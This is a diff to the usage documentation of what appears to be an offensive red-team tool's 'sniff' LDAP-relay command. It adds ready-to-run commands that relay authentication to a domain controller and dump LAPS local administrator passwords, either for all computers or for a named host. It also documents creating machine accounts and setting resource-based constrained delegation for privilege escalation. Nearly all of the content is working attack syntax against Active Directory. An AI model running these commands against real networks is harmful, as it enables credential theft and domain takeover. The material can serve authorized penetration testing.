@@ -103,6 +103,16 @@ sniff -action ldap-relay -response_ip dc01.corp.local -ports 80:636 -protocols a
 sniff -action ldap-relay -response_ip dc01.corp.local -protocols rbcd:CN=DC01,DC=corp,DC=local|S-1-5-21-123456-789-012
 ```
 
+### LDAP Relay — dump LAPS passwords
+```
+sniff -action ldap-relay -response_ip dc01.corp.local -protocols dump-laps
+```
+
+### LDAP Relay — dump LAPS for specific computer
+```
+sniff -action ldap-relay -response_ip dc01.corp.local -protocols dump-laps:SRV01
+```
+
 ### LDAP Relay with custom ports (listen on 8080, target LDAPS 636)
 ```
 sniff -action ldap-relay -response_ip dc01.corp.local -ports 8080:636
@@ -176,8 +186,9 @@ Set the operation via the `-protocols` parameter:
 | Operation | Syntax | Description |
 |-----------|--------|-------------|
 | `whoami` | `-protocols whoami` (default) | LDAP Extended WhoAmI — confirms relayed identity |
-| `add-computer` | `-protocols add-computer:NAME$` | Creates a machine account in AD (default: `FAWKESPC$`) |
+| `add-computer` | `-protocols add-computer:NAME$` | Creates a machine account in AD (default: `FAWKESPC$`). Returns password and SID. Requires LDAPS (port 636) |
 | `rbcd` | `-protocols rbcd:targetDN\|attackerSID` | Sets `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target for resource-based constrained delegation |
+| `dump-laps` | `-protocols dump-laps[:filter]` | Reads LAPS v1/v2 passwords from computer accounts. Optional filter matches sAMAccountName |
 
 ### LDAP Relay Output Example
 
